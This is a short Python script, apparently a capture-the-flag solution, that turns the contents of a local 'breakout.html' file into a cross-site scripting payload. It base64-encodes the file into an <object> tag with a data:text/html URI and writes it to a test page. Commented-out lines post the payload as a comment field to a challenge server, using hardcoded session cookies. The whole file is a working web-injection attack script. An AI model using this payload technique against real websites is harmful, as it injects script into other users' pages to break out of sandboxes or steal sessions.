import base64
import requests

f = open('breakout.html')
c = f.read()
payload = base64.b64encode(c.encode()).decode()
payload = f'<object data=data:text/html;base64,{payload}></object>'
print(payload)
open('test.html', 'w').write(f'<body><div>Outter</div>{payload}</body>')

# cookie = {
#     'PHPSESSID': '2esonnis8rg1mh122iht4u9iq4',
#     'token': 'yB5yjZ1ML2NvBn%2BJzBSGLA%3D%3D'
# }
# requests.post('http://ctf3.linkedbyx.com:11291/main.php', data={
#     'exec': 1,
#     'comment': payload
# }, cookies=cookie)
